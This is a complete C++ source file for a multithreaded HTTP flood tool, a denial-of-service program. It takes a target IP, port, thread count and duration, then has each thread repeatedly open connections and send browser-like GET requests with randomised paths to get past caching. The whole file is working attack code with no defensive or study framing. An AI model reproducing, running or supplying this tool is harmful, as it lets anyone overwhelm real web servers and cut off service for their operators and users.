#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <atomic>
#include <thread>
#include <vector>
#include <string>
#include <chrono>
#include <cstdlib>
#include <cstring>
#include <iostream>

static std::atomic<bool> g_running{false};

static void http_flood_thread(const std::string& ip, int port) {
    // Setup target address
    struct sockaddr_in target;
    target.sin_family = AF_INET;
    target.sin_port = htons(port);
    target.sin_addr.s_addr = inet_addr(ip.c_str());

    // Randomize the path for each thread so it doesn't get cached
    std::string path = "/?q=" + std::to_string(rand() % 999999) + "&id=" + std::to_string(rand() % 999999);
    
    // Build the raw HTTP request
    std::string req = "GET " + path + " HTTP/1.1\r\n"
                      "Host: " + ip + "\r\n"
                      "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36\r\n"
                      "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n"
                      "Accept-Language: en-US,en;q=0.5\r\n"
                      "Connection: keep-alive\r\n"
                      "Cache-Control: no-cache\r\n\r\n";

    while (g_running.load()) {
        int s = socket(AF_INET, SOCK_STREAM, 0);
        if (s < 0) continue;

        // Connect to target
        if (connect(s, (struct sockaddr*)&target, sizeof(target)) == 0) {
            // Send the HTTP request as many times as possible on the open connection
            while (g_running.load()) {
                if (send(s, req.c_str(), req.length(), 0) < 0) {
                    break;
                }
            }
        }
        close(s);
    }
}

int main(int argc, char** argv) {
    if (argc < 5) return 1;
    std::string ip = argv[1];
    int port = atoi(argv[2]);
    int thr  = atoi(argv[3]);
    int dur  = atoi(argv[4]);

    g_running = true;
    std::vector<std::thread> pool;
    for (int i = 0; i < thr; i++) pool.emplace_back(http_flood_thread, ip, port);

    std::thread timer([dur]() {
        std::this_thread::sleep_for(std::chrono::seconds(dur));
        g_running = false;
    });

    for (auto& t : pool)  if (t.joinable()) t.join();
    if (timer.joinable()) timer.join();
    return 0;
}
